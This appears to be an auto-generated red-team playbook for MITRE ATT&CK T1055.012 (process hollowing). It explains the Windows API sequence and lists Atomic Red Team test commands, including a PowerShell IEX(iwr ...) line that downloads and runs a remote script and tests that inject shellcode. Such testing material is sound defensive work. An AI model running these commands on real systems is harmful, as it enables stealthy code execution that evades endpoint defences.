---
name: "T1055.012_process-hollowing"
description: "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1055.012
  - defense-evasion
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1055.012"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1055/012"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1055
  - T1055.001
  - T1055.002
  - T1055.003
  - T1055.004
  - T1055.005
  - T1055.008
  - T1055.009
  - T1055.011
  - T1055.013
  - T1055.014
  - T1055.015
prerequisites:
  - T1055
severity_boost:
  T1055: "Chain with T1055 for deeper attack path"
  T1055.001: "Chain with T1055.001 for deeper attack path"
  T1055.002: "Chain with T1055.002 for deeper attack path"
---

# T1055.012 Process Hollowing

> **Sub-technique of:** T1055

## High-Level Description

Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. 

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code> before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.

This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Process Hollowing technique is applicable to target environment
- [ ] Check Windows systems for indicators of Process Hollowing
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Process Hollowing using PowerShell

This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)

**Supported Platforms:** windows

```powershell
. "#{script_path}"
$ppid=Get-Process #{parent_process_name} | select -expand id
Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
```

**Dependencies:**
- Start-Hollow.ps1 must be installed

### Atomic Test 2: RunPE via VBA

This module executes notepad.exe from within the WINWORD.EXE process

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "#{ms_product}" -sub "Exploit"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed

### Atomic Test 3: Process Hollowing in Go using CreateProcessW WinAPI

Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.
- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)

**Supported Platforms:** windows

```powershell
$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program "#{hollow_binary_path}" -debug
```

### Atomic Test 4: Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)

Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.
This test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe
allows for the retrieval of output generated from executed shellcode.
- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)

**Supported Platforms:** windows

```powershell
$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "#{hollow_binary_path}" -debug
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Process Hollowing by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1055.012 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1040 Behavior Prevention on Endpoint
Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process.


## Detection

### Detection Strategy for Process Hollowing on Windows


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Process Hollowing technique applicable | High | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [Nviso Spoof Command Line 2020](https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/)
- [Elastic Process Injection July 2017](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [Leitch Hollowing](https://new.dc414.org/wp-content/uploads/2011/01/Process-Hollowing.pdf)
- [Mandiant Endpoint Evading 2019](https://www.mandiant.com/resources/staying-hidden-on-the-endpoint-evading-detection-with-shellcode)
- [Atomic Red Team - T1055.012](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1055.012)
- [MITRE ATT&CK - T1055.012](https://attack.mitre.org/techniques/T1055/012)
